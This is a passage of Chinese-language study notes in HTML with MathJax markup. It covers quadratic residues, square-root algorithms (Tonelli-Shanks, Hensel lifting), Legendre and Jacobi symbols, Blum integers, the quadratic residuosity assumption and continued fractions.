n,\\则称a为模n下的二次剩余，\\并称b为a在模n下的平方根</script><p>二次剩余的集合：$(\mathbb{Z}_n^{*})^2$</p><script type="math/tex; mode=display">(\mathbb{Z}_n^{*})^2=\{b^2|b\in \mathbb{Z_n^{*}}\}</script><script type="math/tex; mode=display">a,b\in \mathbb{Z_n}或\mathbb{Z_n^{*}}时，ab\ mod\ n,简写为 ab</script><script type="math/tex; mode=display">若a\in \mathbb{(Z_n^{*}})^2,则存在b\in \mathbb{Z_n^{*}}，使得b^2\equiv a\pmod n)</script><p>$a是模n下的二次剩余\iff a\in (\mathbb{Z_n^*})^2$</p><h3 id="模p下的二次剩余"><a href="#模p下的二次剩余" class="headerlink" title="模p下的二次剩余"></a>模p下的二次剩余</h3><ul><li><p>$设p是奇素数(p是素数，且p\neq2)$</p><p>$1.设b\in \mathbb{Z_p},则b^2=1\iff b=\pm1$</p><p>$2.设b,c\in \mathbb{Z_p^*},则b^2=c^2\iff b=\pm c$</p><p>$3.|(\mathbb{Z_p^*})^2|=(p-1)/2$</p></li></ul><h4 id="欧拉准则-Euler’s-criterion"><a href="#欧拉准则-Euler’s-criterion" class="headerlink" title="欧拉准则(Euler’s criterion)"></a>欧拉准则(Euler’s criterion)</h4><p>$设p是奇素数，a\in \mathbb{Z_p^*,}则$</p><ul><li><p>$1.\ a^{\frac{p-1}2}=\pm1$(证明依据欧拉定理)</p></li><li><p>$2.\ a\in (\mathbb{Z_p^*})^2\Rightarrow a^{\frac{p-1}2}=1$</p></li><li><p>$3.\ a\notin (\mathbb{Z_p^*})^2\Rightarrow a^{\frac{p-1}2}=-1$</p><p>$设p是奇素数，a,b\in \mathbb{Z_p^*},则a,b同为二次剩余或二次非剩余时，ab为二次剩余\(ab)^{\frac{p-1}2}=a^{\frac{p-1}2}b^{\frac{p-1}2}$</p></li></ul><h4 id="模p下-1-的平方根"><a href="#模p下-1-的平方根" class="headerlink" title="模p下$-1$的平方根"></a>模p下$-1$的平方根</h4><ul><li>$性质一：p\equiv 1\pmod 4\iff {-1}\in(\mathbb{Z_p^*})^2$</li><li><script type="math/tex; mode=display">性质二：设p\equiv 1\pmod 4,c\in \mathbb{Z_p^*}\setminus(\mathbb{Z_p^*})^2\\令b:=c^{\frac{p-1}4}\pmod p,则\\b^2\equiv -1\pmod p</script></li></ul><h4 id="费马二平方定理（Fermats’s-two-squares-theorem）"><a href="#费马二平方定理（Fermats’s-two-squares-theorem）" class="headerlink" title="费马二平方定理（Fermats’s two squares theorem）"></a>费马二平方定理（Fermats’s two squares theorem）</h4><script type="math/tex; mode=display">设p是奇素数，则\\p\equiv 1\pmod 4\iff p=s^2+t^2,s,t\in \mathbb{Z}</script><h4 id="求平方根"><a href="#求平方根" class="headerlink" title="求平方根"></a>求平方根</h4><p>$p\equiv 3\pmod 4求二次剩余的平方根$</p><p>$设a\in (\mathbb{Z_p^*})^2，p\equiv 3\pmod 4，则a的一个平方根为b=a^{\frac{p+1}{4}}$</p><p><strong>通用算法(Tonelli-Shanks算法)(a是二次剩余，求a的平方根)</strong></p><p>$p是奇数\Rightarrow p-1是偶数\Rightarrow p-1=2^tm(m是奇数，令m=2q+1)$</p><blockquote><p>1.$计算t、m,满足p-=2^tm$</p><p>2.<script type="math/tex">找一个u\in Z_p^*\setminus (Z_p^*)^2,计算a^m和u^m</script></p><p>3.$计算x，使得(u^m)^x=a^m$</p><p>4.$计算k=u^{\frac{mx}2}(易知，k^2=a^m)$</p><p>5.$output：\pm ka^{-q}$</p><p>$(\pm ka^{-q})^2=k^2a^{-2q}=a^ma^{-2q}=a^{m-2p}=a$</p><p>PS:$t=1时，p=2m+1=2(2q+1)+1=4q+3\Rightarrow p\equiv 3\pmod 4$</p><p>​      $t&gt;1时，不断地随机寻找整数u，直到(\frac{u}p)=-1为止$</p></blockquote><h3 id="模-p-k-下的二次剩余"><a href="#模-p-k-下的二次剩余" class="headerlink" title="模$p^k$下的二次剩余"></a>模$p^k$下的二次剩余</h3><p>$p是奇素数，k是正整数,p^k\mid a\Rightarrow p\mid a$</p><p>$1.设b\in \mathbb{Z_{p^k}},则b^2=1\iff b=\pm1$</p><p>$2.设b,c\in \mathbb{Z_{p^k}^*},则b^2=c^2\iff b=\pm c$</p><p>$3.|(\mathbb{Z_{p^k}^*)}^2|=\phi(p^k)/2$</p><p>$设p是奇素数，a\in \mathbb{Z_{p^k}^*},则$</p><ul><li><p>$1.\ a^{\frac{\phi(p^k)}2}=\pm1$(证明依据欧拉定理)</p></li><li><p>$2.\ a\in (\mathbb{Z_{p^k}^*)}^2\Rightarrow a^{\frac{\phi(p^k)}2}=1$</p></li><li><p>$3.\ a\notin (\mathbb{Z_{p^k}^*)}^2\Rightarrow a^{\frac{\phi(p^k)}2}=-1$</p><script type="math/tex; mode=display">设p是奇素数，a,b\in \mathbb{Z_p^*},则a,b同为二次剩余或二次非剩余时，ab为二次剩余\\(ab)^{\frac{p-1}2}=a^{\frac{p-1}2}b^{\frac{p-1}2}</script></li></ul><script type="math/tex; mode=display">a\in (\mathbb{Z_{p^k}^*})^2\iff a\in (\mathbb{Z_p^*})^2</script><h4 id="求平方根-1"><a href="#求平方根-1" class="headerlink" title="求平方根"></a>求平方根</h4><p>$gcd(a,p)=1,k&gt;1是整数$</p><p>$a是模p^k下的二次剩余\iff a是模p下的二次剩余\ \ \underrightarrow{Tonelli-Shanks算法}\ \ 模p下的平方根\ \rightarrow 模p^2下的平方根\rightarrow\dots\rightarrow 模p^k下的平方根(Hensel\ lifting)$</p><h4 id="Hensel-lifting技术"><a href="#Hensel-lifting技术" class="headerlink" title="Hensel  lifting技术"></a>Hensel  lifting技术</h4><p>$设t\geq 1是整数，a在模p^t下的平方根是b，即b^2\equiv a\pmod {p^t}$</p><p>$目标：利用b，求出a在模p^{t+1}下的平方根c$</p><blockquote><p>$c^2\equiv a\pmod {p^{t+1}}\Rightarrow c^2\equiv a\pmod {p^t}\Rightarrow c^2\equiv b^2\pmod{p^t}\Rightarrow c\equiv \pm b\pmod{p^t}$</p><p>$设c=b+p^tv,则有c^2\equiv (b+p^tv)^2\equiv b^2+2bp^tv\pmod {p^{t+1}}(完全平方展开)$</p><p>$a-b^2\equiv 2bp^tv\pmod{p^{t+1}}$</p><p>$\frac{a-b^2}{p^t}\equiv 2bv\pmod p\Rightarrow v\equiv (\frac{a-b^2}{p^t})(2b)^{-1}\pmod p$</p></blockquote><h3 id="模n下的二次剩余"><a href="#模n下的二次剩余" class="headerlink" title="模n下的二次剩余"></a>模n下的二次剩余</h3><p>$设n&gt;1是奇数，且n=p_1^{k1}\times\dots\times p_m^{k_m}$</p><ul><li><p>$a\in (Z_n^*)^2\iff a_i\in(Z_{p_i^{k_i}})^2,i=1,\dots,m$</p></li><li><p>$|(Z_n^*)|=\phi(n)/2^m$</p></li><li><p>$a\in (Z_n^*)^2,则a恰好有2^m个平方根$</p><script type="math/tex; mode=display">a\in (Z_n^*)^2\iff a\pmod {p_i^{k_i}}\in (\mathbb{Z_{p_i^{k_i}}^*})^2\iff a\pmod {p_i} \in (\mathbb{Z_{p_i}^*})^2,i=1,\dots,m</script></li></ul><blockquote><p>例：$45=3^2×5 ，此时m = 2$</p><p>所以： $|\mathbb{(Z_{45}^∗)^2}|=\frac{\phi(45)}{2^2}=6 。$</p><p>可以用中国剩余映射计算： $(\mathbb{Z_9^∗})^2={1,4,7} , (\mathbb{Z_5^∗})2={1,4}$</p><p>可得：</p><p>$(\mathbb{Z_9^∗})^2×(\mathbb{Z_5^∗})^2={(1,1),(1,4),(4,1),(4,4),(7,1),(7,4)}$</p><p>然后用中国剩余定理就可以求解具体二次剩余。</p><p><strong>平方根找法</strong>：比如$(1，4)$可以拆解为</p><p>$(Z_9^∗)×(Z_5^∗)={(1,2),(−1,2),(1,−2),(−1,−2)}$</p></blockquote><h4 id="求平方根-2"><a href="#求平方根-2" class="headerlink" title="求平方根"></a>求平方根</h4><p>$n=p_1^{k_1}\dots p_m^{k_m}是奇合数$</p><p>$a(=b^2)\ \underrightarrow{中国剩余映射}\ (a_1,\dots,a_m)\rightarrow (b_1,\dots,b_m)\ \underrightarrow{中国剩余定理}\ b$</p><h4 id="若已知“求平方根“的高效算法，可构造高效算法来“因子分解n”"><a href="#若已知“求平方根“的高效算法，可构造高效算法来“因子分解n”" class="headerlink" title="若已知“求平方根“的高效算法，可构造高效算法来“因子分解n”"></a>若已知“求平方根“的高效算法，可构造高效算法来“因子分解n”</h4><blockquote><p>原理：$n=pq$确定性算法A(a,n)返回a在模数n下的一个平方根</p><p>B(n):$随机选择b\in {1,\dots,n-1}$</p><p>​        $if\ d:=gcd(b,n)&gt;1:output\ \ d,n/d$</p><p>​        $else\ a=b^2,b’=A(a,n)$</p><p>​                $if\ b’=\pm b: output\ ‘failure’$</p><p>​                $else\ output\ d’:=gcd(b-b’,n),n/d’$</p><div class="table-container"><table><thead><tr><th style="text-align:center">$n的平方根$</th><th style="text-align:center">模p、q后余数形成的二元组</th></tr></thead><tbody><tr><td style="text-align:center">b</td><td style="text-align:center">$(b_1,b_2)$</td></tr><tr><td style="text-align:center">-b</td><td style="text-align:center">$(-b_1,-b_2)$</td></tr><tr><td style="text-align:center">b’</td><td style="text-align:center">$(-b_1,b_2)$</td></tr><tr><td style="text-align:center">-b’</td><td style="text-align:center">$(b_1,-b_2)$</td></tr></tbody></table></div><p>$b-b’\rightarrow(b_1,b_2)-(-b_1,b_2)=(2b_1,0)\rightarrow\ 模q为0，是q的倍数$</p></blockquote><h3 id="归纳"><a href="#归纳" class="headerlink" title="归纳"></a>归纳</h3><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">二次剩余数量</th><th style="text-align:center">二次剩余的平方根</th></tr></thead><tbody><tr><td style="text-align:center">$p$</td><td style="text-align:center">$\phi(p)/2(集合大小的一半）$</td><td style="text-align:center">$2个$</td></tr><tr><td style="text-align:center">$p^k$</td><td style="text-align:center">$\phi(p^k)/2(集合大小的一半）$</td><td style="text-align:center">$2个$</td></tr><tr><td style="text-align:center">$n$</td><td style="text-align:center">$\phi(n)/2^m(集合大小的1/2^m)$</td><td style="text-align:center">$2^m个$</td></tr></tbody></table></div><p>求二次剩余的平方根</p><div class="table-container"><table><thead><tr><th style="text-align:center">模数</th><th style="text-align:center">主要算法</th></tr></thead><tbody><tr><td style="text-align:center">$p$</td><td style="text-align:center">Tonelli-Shanks</td></tr><tr><td style="text-align:center">$p^k$</td><td style="text-align:center">Hensel lifting</td></tr><tr><td style="text-align:center">$n$</td><td style="text-align:center">已知因子分解：中国剩余映射/定理；未知因子：高效算法未知</td></tr></tbody></table></div><hr><h2 id="勒让德符号"><a href="#勒让德符号" class="headerlink" title="勒让德符号"></a>勒让德符号</h2><p><strong>定义</strong>：$设p是奇素数，整数a满足gcd(a,p)=1,则勒让德符号定义为：$</p><script type="math/tex; mode=display">(\frac {a}{p}):=\begin{cases}1,&{a\in (Z_p^*)^2}\\[4ex]{-1},&{a\in (Z_p^*)\setminus(Z_p^*)^2}\end{cases}</script><p>$且如果p\mid a,则令(\frac {a}{p})=0$</p><p>性质:$设p是奇素数，a,b\in Z,则有$</p><ul><li><p>$1.\ (\frac {a}{p})\equiv a^{\frac{p-1}2}\pmod p；特别地，(\frac {-1}{p})= (-1)^{\frac{p-1}2}$</p></li><li><p>$2.\ (\frac {a}{p})(\frac {b}{p})=(\frac {ab}{p})$</p></li><li><p>$3.\ a\equiv b\pmod p \Rightarrow (\frac {a}{p})=(\frac {b}{p})$</p></li><li><p>$4.\ (\frac {2}{p})=(-1)^{\frac{p^2-1}{8}}\ \ \ \ \ \ 2\in(Z_p^*)^2\iff p\equiv \pm 1\pmod 8$</p></li><li><p>$5.\ 二次互反律(使用前要检查是否存在模4余1)：设p、q是奇素数，则有(\frac {p}{q})=(-1)^{ {\frac{p-1}2}{\frac{q-1}2} }(\frac {q}{p})$</p><p>$若p\equiv 1\pmod 4\ or\ q\equiv 1\pmod 4\iff (\frac {p}{q})=(\frac {q}{p}),反之则(\frac {p}{q})=-(\frac {q}{p})$</p></li></ul><hr><h2 id="雅可比符号"><a href="#雅可比符号" class="headerlink" title="雅可比符号"></a>雅可比符号</h2><p><strong>定义</strong>：$设a是整数，n是正整数，n=p_1\dots p_t，其中p_i都是奇素数(彼此可以相等)，则雅可比符号定义为：$</p><p>$(\frac {a}{n})=(\frac {a}{p_1})\dots (\frac {a}{p_t})\ 且令(\frac {a}{1})=1$</p><p>$gcd(a,n)&gt;1\iff (\frac{a}{n})=0$</p><p><strong>性质</strong>:$设m和n是正奇数，a,b\in \mathbb{Z},则有$</p><ul><li><p>$1.\ \ (\frac {-1}{n})\equiv {(-1)}^{\frac{n-1}2}$</p></li><li><p>$2.\ (\frac {a}{n})(\frac {b}{n})=(\frac {ab}{n})$</p></li><li><p>$3.\ a\equiv b\pmod n \Rightarrow (\frac {a}{n})=(\frac {b}{n})$</p></li><li><p>$4.\ (\frac {2}{n})=(-1)^{\frac{n^2-1}{8}}$</p></li><li><p>$5.\ (\frac {a}{mn})=(\frac {a}{m})(\frac {a}{n})$</p></li><li><p>二次互反律的推广：</p><p>$(\frac {m}{n})={(-1)}^{ {\frac{m-1}2}{\frac{n-1}2} }(\frac {n}{m})$</p><p>$若m\equiv 1\pmod 4\ or\ n\equiv 1\pmod 4\iff (\frac {m}{n})=(\frac {n}{m}),反之则(\frac {m}{n})=-(\frac {n}{m})$</p></li><li><p>能否判断二次剩余？</p><blockquote><p>$(\frac{a}{n})=0或-1\Rightarrow a\notin (Z_n^*)^2$</p><p>$(\frac{a}{n})=1\Rightarrow 无法判断$</p><p>$a\in (Z_n^*)^2\Rightarrow (\frac{a}{n})=1$</p></blockquote></li></ul><hr><h2 id="雅可比映射-Jacobi-map"><a href="#雅可比映射-Jacobi-map" class="headerlink" title="雅可比映射(Jacobi map)"></a>雅可比映射(Jacobi map)</h2><p>$J_n:Z_n^*\rightarrow{\pm1}$</p><p>$a\in Z_n^*\rightarrow (\frac{a}{n})=\pm1$</p><p>$雅可比映射的核：Ker\ J_n：Z_n^*中映射到1的部分形成的一个子集$</p><h3 id="二次剩余性假设-QR假设-Quadratic-residuosity-assumption"><a href="#二次剩余性假设-QR假设-Quadratic-residuosity-assumption" class="headerlink" title="二次剩余性假设(QR假设,Quadratic residuosity assumption)"></a>二次剩余性假设(QR假设,Quadratic residuosity assumption)</h3><script type="math/tex; mode=display">设n=pq，其中p和q是不同的素数，\\在不知道p和q的情况下，\\给定\mathbb{Z_n^*}中的其中一个整数，(从\mathbb{Ker\ J_n}里随机选择一个整数）\\将难以判断他是不是二次剩余(难以区分二次剩余和二次非剩余,\\即难以区分它属于\mathbb{(Z_n^*)^2}还是\mathbb{Ker\ J_n\setminus (Z_n^*)^2}。</script><p>$(\frac{a}{n})=-1\Rightarrow a是模n下二次非剩余$</p><p>$(\frac{a}{n})=1时,(\frac{a}{p})、(\frac{a}{q})可能同为1或-1，仅前者才是二次剩余$</p><hr><h2 id="半素数（semi-prime）"><a href="#半素数（semi-prime）" class="headerlink" title="半素数（semi-prime）"></a>半素数（semi-prime）</h2><p><strong>定义</strong>：又称“二素数”（biprime），则$n$是半素数，则$n=pq$ ,$p$和$q$<br>都是$n$的素因子 ($p$和$q$可以相同)。比如：4,6,9,10,$\cdots$</p><p>Blum整数是一种半素数👇</p><h3 id="Blum整数"><a href="#Blum整数" class="headerlink" title="Blum整数"></a>Blum整数</h3><p><strong>定义</strong>：$n是Blum整数，则n=pq，p\equiv q\equiv 3\pmod 4$是两个不同的素因子。</p><p><strong>性质</strong>：设n是Blum整数</p><ul><li><p>1.<script type="math/tex">(\frac{-1}{p})=(\frac{-1}{q})=-1\\(\frac{-1}{n})=(\frac{-1}{p})(\frac{-1}{q})=(-1)(-1)=1</script></p></li><li><p>2.<script type="math/tex">对于任意  a \in Z_{n}^{*},\left(\frac{a}{n}\right)=1 \Rightarrow a \in\left(Z_{n}^{*}\right)^{2}  或  -a \in\left(Z_{n}^{*}\right)^{2}</script></p><blockquote><p>$\left(\frac{a}{n}\right)=\left(\frac{a}{p}\right)\left(\frac{a}{q}\right)=1 \Rightarrow\left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=1  或  \left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=-1 $</p><p>$\left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=1 \Rightarrow a \in\left(Z_{n}^{*}\right)^{2}时：$</p><script type="math/tex; mode=display">\left(\frac{-a}{p}\right)=\left(\frac{-1}{p}\right)\left(\frac{a}{p}\right)=-1 \times 1=-1 , 同理,  \left(\frac{-a}{q}\right)=-1 \Rightarrow-a \in Z_{n}^{*} \backslash\left(Z_{n}^{*}\right)^{2}</script><p>$\left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=-1时同理可得-a \in\left(Z_{n}^{*}\right)^{2}$</p></blockquote></li><li><p>3.对于任意$a\in(Z_n^*)^2$,设它的四个平方根为$\pm b$和 土$b^\prime$,则</p></li></ul><p>  $\left(\frac bp\right)=\left(\frac bq\right)=1$,即$b\in(Z_n^*)^2$</p><p>  $\left(\frac{-b}p\right)=\left(\frac{-b}q\right)=-1$</p><p>  $\left(\frac{b^{\prime}}p\right)=1,\left(\frac{b^{\prime}}q\right)=-1$<br>  $\left(\frac{-b^{\prime}}p\right)=-1,\:\left(\frac{-b^{\prime}}q\right)=1$</p><ul><li><p>4.函数$f(x)=x^2mod$ $n$是定义在$(Z_n^*)^2$上的置换。</p><script type="math/tex; mode=display">x\in(Z_n^*)^2\Rightarrow f(x)=x^2\:mod\:n\in(Z_n^*)^2</script><script type="math/tex; mode=display">f(x)=y\in(Z_n^*)^2\Rightarrow$有唯一的平方根 $x\in(Z_n^*)^2</script></li><li><p>5.设$a\in(Z_n^*)^2$,雅可比符号是1的两个平方根中只有一个小于$\frac n2$ (另一个大于$\frac n2)$。</p><blockquote><p>暗示：雅可比符号是 -1 的两个平方根中只有一个的值小于 $\frac n2$ (另一个大于$\frac n2)$<br>取值小于 (大于)$\frac n2$的两个平方根的雅可比符号互为相反数。</p></blockquote></li></ul><hr><h2 id="连分数（Continued-Fraction）"><a href="#连分数（Continued-Fraction）" class="headerlink" title="连分数（Continued Fraction）"></a>连分数（Continued Fraction）</h2><h3 id="简单连分数-Simple-Continued-Fraction"><a href="#简单连分数-Simple-Continued-Fraction" class="headerlink" title="简单连分数(Simple Continued Fraction)"></a>简单连分数(Simple Continued Fraction)</h3><p>$a_0+\frac1{a_1+\frac1{a_2+\frac1{a_3+\frac1{…}}}}$<br>$a_0$可以是任意整数，$a_i$是正整数$(i&gt;0):$部分商 (partial quotient)<br>$[a_0,a_1,a_2,a_3,…]$</p><blockquote><p>例：$\frac{43}{19}= 2+\frac1{3+\frac1{1+\frac14}}=[2,3,1,4]=[2,[3,1,4]]=2+\frac{1}{[3,1,4]}$</p></blockquote><p>任何实数都可以用连分数的形式来表示</p><p>$\mathbb{Q}={\frac ab\mid a,b\in\mathbb{Z},b\neq0}$</p><h4 id="有限连分数-Finite-Continued-Fraction"><a href="#有限连分数-Finite-Continued-Fraction" class="headerlink" title="有限连分数(Finite Continued Fraction)"></a>有限连分数(Finite Continued Fraction)</h4><p>$[a_0,a_1,\dots,a_n]$</p><p><strong>定理</strong>：任何有理数都可以表示成有限连分数；任何<br>有限连分数都是一个有理数。<br>$\frac ab\ \underleftrightarrow{欧几里得算法}\ [a_0,a_1,…,a_n]$</p><p>$[a_0,a_1,\dots,a_n]=[a_0,a_1,\dots,a_m,[a_{m+1}\dots,a_n]]$</p><p><strong>有限连分数表示倒数</strong></p><p>给定有限连分数$[a_0,a_1,…,a_n]$,求倒数</p><ul><li>如果$a_0=0$,就把0去掉：$[a_1,…,a_n]$</li><li>如果$a_0\neq0$,就在前面补上$0:[0,a_0,…,a_n]$</li></ul><h5 id="有限连分数的等价表示"><a href="#有限连分数的等价表示" class="headerlink" title="有限连分数的等价表示"></a>有限连分数的等价表示</h5><p> $n&gt; 0$,$a_n=1$时，$[a_0,a_1,…,1]=[a_0,a_1,…,a_{n-1}+1]$<br>否则，$[a_0,a_1,…,a_n]=[a_0,a_1,…,a_n-1,1]$</p><h5 id="唯一性表达"><a href="#唯一性表达" class="headerlink" title="唯一性表达"></a>唯一性表达</h5><p><strong>定理</strong>：如果两个有限连分数$[a_0,…,a_n],[b_0,…,b_m]$都等于有理数$x$,并且$a_n&gt;1,b_m&gt;1$,那么$n=m$,而且它俩是完全相同的。</p><h4 id="无限连分数-Infinite-Continued-Fraction"><a href="#无限连分数-Infinite-Continued-Fraction" class="headerlink" title="无限连分数(Infinite Continued Fraction)"></a>无限连分数(Infinite Continued Fraction)</h4><p>$[a_0,a_1,\dots]$</p><p>表示无理数</p><p><strong>定理1：</strong>对于无限连分数$[ a_0, a_1, . . . ]$,     $x_n= [ a_0, a_1, . . . , a_n]$是第n个渐进分数。如果$n\to\infty$,则$x_n\to x$ , $x\in R$ 。<br>$x=[a_0,a_1,\dots]$</p><p><strong>渐进分数的分母满足以下性质</strong>：<br>第n个渐进分数$[a_0,a_1,…,a_n]=x_n=\frac{p_n}{q_n}$ ,<br>则 $q_n\geq n$。如果$n&gt;3$,则 $q_n&gt;n$。(证明略)</p><p><strong>性质</strong>：</p><ul><li>任何无限连分数都小于它的任意奇数编号的渐进分数，而大于任意偶数编号的。(三明治结构)</li><li>$a_t$是第$t$个完全商的整数部分。特别的，$a_0$是无限连分数的整数部分。</li><li>两个无限连分数，如果它们表示的实数相同、它俩就是完全相同的。</li><li>任何无理数表示成无限连分数时，其表示形式是唯一的。</li></ul><h3 id="渐进分数"><a href="#渐进分数" class="headerlink" title="渐进分数"></a>渐进分数</h3><p><strong>定义</strong>：$\begin{aligned}\text{称 }&amp;[a_0,…,a_m]\left(0\leq m\leq n\right)\text{为 }[a_0,a_1,…,a_n]\text{的第m个渐进分数。}\end{aligned}$</p><p>普遍规律：原本的分数居中，偶数编号位于左边，呈递增趋势，奇数编号位于右边，呈递减趋势，从两边逐渐逼近。</p><p>$[a_0]=\frac{p_0}{q_0}$<br>$[a_0,a_1]=\frac{p_1}{q_1}$<br>$[a_0,a_1,…,a_n]=\frac{p_n}{q_n}$<br>$\frac{p_0}{q_0}&lt;\frac{p_2}{q_2}&lt;\cdots&lt;\frac{p_n}{q_n}&lt;\cdots&lt;\frac{p_3}{q_3}&lt;\frac{p_1}{q_1} $</p><p><strong>迭代公式</strong></p><p>写成$[a_0,…,a_m]=\frac{p_n}{q_n}$<br>则有$p_n=a_np_{n-1}+p_{n-2},\quad q_n=a_nq_{n-1}+q_{n-2}\quad(n\geq2)$</p><p><img src="/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/渐进分数.jpg" alt="渐进分数"></p><h4 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h4><p>$p_n q_{n-1}-p_{n-1} q_n=(-1)^{n-1}$</p><h3 id="完全商-Complete-quotient"><a href="#完全商-Complete-quotient" class="headerlink" title="完全商(Complete quotient)"></a>完全商(Complete quotient)</h3><p><strong>定义</strong>：称<script type="math/tex">[a_t,\dots,a_n](0≤t\leq n)为[a_0,a_1,...,a_n]的第t个完全商</script></p><p><strong>定理</strong>：$\text{定理:给定有限连分数 }[a_0,a_1,…,a_n]\text{,有}$</p><p>$\bullet\text{ 如果 }a_n=1\text{,则 }[a_{n-1},a_n]\text{ 的整数部分是 }a_{n-1}+1$</p><p>$\bullet\text{ 否则 }[a_t,…,a_n]\text{ (0}\leq t\leq n)\text{ 的整数部分是 }a_t$</p><h3 id="单调性（monotone-properties）"><a href="#单调性（monotone-properties）" class="headerlink" title="单调性（monotone properties）"></a>单调性（monotone properties）</h3><ul><li><p>性质1：所有偶数编号的渐进分数是严格递增的($\frac{p_0}{q_0}&lt;\frac{p_2}{q_2}&lt;\cdotp\cdotp\cdotp)$,而奇数编号的则是严格递减的($…&lt;\frac{p_3}{q_3}&lt;\frac{p_1}{q_1}).$</p></li><li><p>性质2：任何奇数编号的渐进分数大于和它相邻的两个偶数编号的渐进分数。</p></li><li><p>性质3：$\frac{p_0}{q_0}&lt;\frac{p_2}{q_2}&lt;\cdots&lt;\frac{p_n}{q_n}&lt;\cdots&lt;\frac{p_3}{q_3}&lt;\frac{p_1}{q_1} $</p><blockquote><p>如果$n$是偶数，则$x_n$是偶数编号里最大的渐进分数，<br>且 $x_n$小于所有奇数编号的渐进分数。</p><p>如果$n$是奇数，则$x_n$是奇数编号里最小的渐进分数，</p><p>且 $x_n$大于所有偶数编号的渐进分数。</p></blockquote></li></ul><h3 id="连分数算法-continued-fraction-algorithm"><a href="#连分数算法-continued-fraction-algorithm" class="headerlink" title="连分数算法 (continued fraction algorithm)"></a>连分数算法 (continued fraction algorithm)</h3><p>欧几里得算法只能处理分数，不能处理小数</p><p>输入：实数$x$</p><p>令$i=0,x_0=x;$</p><ul><li>step1.    令$a_i$为 $x_i$的整数部分；</li><li>step2.     $b_i=x_i-a_i$</li><li>step3.    $ if\ b_i\neq0$, then $i++,x_i=1/_{b_i}$,$转去step1$;</li><li>else return $[a_0,a_1,…]$ ;</li></ul><h3 id="周期连分数-periodic-continued-fraction"><a href="#周期连分数-periodic-continued-fraction" class="headerlink" title="周期连分数(periodic continued fraction)"></a>周期连分数(periodic continued fraction)</h3><p><strong>定义</strong>：周期连分数$[a_0,a_1,…]$是无限连分数，而且对于固定的正整数$k$,以及所有的$l\geq L$,<br>都有$a_l=a_{l+k}$ ,<br>部分商$a_L,…,a_{L+k-1}$称作 <strong>周期(period)</strong>。</p><p>可简写成$\left[a_0,…,a_{L-1},\overline{a_L,…,a_{L+k-1}}\right]$。</p><blockquote><p>例：$\begin{aligned}&amp;[2,5,1,4,3,6,1,4,3,6,…]\&amp;=[2,5,\overline{1,4,3,6}]\end{aligned}$</p></blockquote><p>一元二次方程</p><script type="math/tex; mode=display">ax^2+bx+c=0\quad(a,b,c\in\mathbb{Z},\:a\neq0)</script><p>二次不尽根$: u\pm \sqrt {w}$ $( u, w\in Q)$ ,$\sqrt{w}$ 是无理数 ($w$不能完全开方）</p><ul><li><strong>定理(欧拉)</strong>:如果t是周期连分数，它就一定是二次不尽根</li><li><strong>定理(拉格朗日)</strong>:如果t是二次不尽根，它就一定是周期连分数</li></ul><blockquote><script type="math/tex; mode=display">\begin{aligned}x^2-2x-1&=0\\x^{2}&=2x+1\\x&=2+\frac1x\\&=2+\frac1{2+\frac1x}\\&=2+\frac{1}{2+{\frac{1}{\dots}}}=[2,2,\dots]=1+\sqrt{2}(白银比例)\end{aligned}</script><script type="math/tex; mode=display">\begin{aligned}x^2-x-1&=0\\x^{2}&=x+1\\x&=1+\frac1x\\&=1+\frac1{1+\frac1x}\\&=1+\frac{1}{1+{\frac{1}{\dots}}}=[1,1,\dots]=\frac{1+\sqrt{5}}2(黄金比例)\end{aligned}</script></blockquote><h4 id="周期连分数与数列"><a href="#周期连分数与数列" class="headerlink" title="周期连分数与数列"></a>周期连分数与数列</h4><h5 id="斐波那契数列-1-1-2-3-5-8-13-dots"><a href="#斐波那契数列-1-1-2-3-5-8-13-dots" class="headerlink" title="斐波那契数列 $1,1,2,3,5,8,13,\dots$"></a><strong>斐波那契数列</strong> $1,1,2,3,5,8,13,\dots$</h5><p>$F_0=1,\quad F_1=1,$<br>$F_n=F_{n-1}+F_{n-2}=\frac{\phi^n-(-\phi)^{-n}}{\sqrt{5}}\quad(\phi=\frac{1+\sqrt{5}}2)$</p><ul><li><strong>黄金比例的周期连分数的各个渐进分数恰好是斐波那契数列相邻两项相除所得的分数</strong></li></ul><h5 id="佩尔数列-0-1-2-5-12-29-70-dots"><a href="#佩尔数列-0-1-2-5-12-29-70-dots" class="headerlink" title="佩尔数列 $0,1,2,5,12,29,70,\dots$"></a><strong>佩尔数列</strong> $0,1,2,5,12,29,70,\dots$</h5><p>$P_0=0,P_1=1,$</p><p>$P_n=2P_{n-1}+P_{n-2}=\frac{(1+\sqrt{2})^n-(1-\sqrt{2})^n}{2\sqrt{2}}$</p><ul><li><strong>白银比例的周期连分数的各个渐进分数恰好是佩尔数列相邻两项相除所得的分数</strong></li></ul><h3 id="最佳近似值-amp-丢番图逼近-Diophantine-approximation"><a href="#最佳近似值-amp-丢番图逼近-Diophantine-approximation" class="headerlink" title="最佳近似值&amp;丢番图逼近(Diophantine approximation)"></a>最佳近似值&amp;丢番图逼近(Diophantine approximation)</h3><p><strong>最佳近似值定义</strong>：在数轴上，如果与其他有理数相比，$\frac pq$ ($p$和$q$ 没有公因子)到实数$x$ 的距离更近，那么$\frac pq$就叫作$x$ 的最佳近似值(<strong>只考虑分母大小不超过q的有理数</strong>)</p><p><strong>定理</strong>：$\text{设 }x=[a_0,a_1,…]\text{,在分母不超过 }q_t\text{ 的有理数中,}\\text{第}t\text{个渐进分数 }\frac{p_t}{q_t}\text{ 是 实数 }x\text{ 的最佳近似值。}$(证明略)</p><p><strong>一个实数所有的渐进分数都是他的最佳近似值</strong>(分母不超过渐进分数的分母的全部有理数范围内)</p><p><strong>实数的最佳近似值不只有它的渐进分数</strong></p><h4 id="半渐进分数-semi-convergent-次渐进分数-secondary-convergent"><a href="#半渐进分数-semi-convergent-次渐进分数-secondary-convergent" class="headerlink" title="半渐进分数(semi-convergent)(次渐进分数(secondary convergent))"></a>半渐进分数(semi-convergent)(次渐进分数(secondary convergent))</h4><p><strong>定义</strong>：设 $x=[a_0,a_1,…],\frac{p_t}{q_t}$ 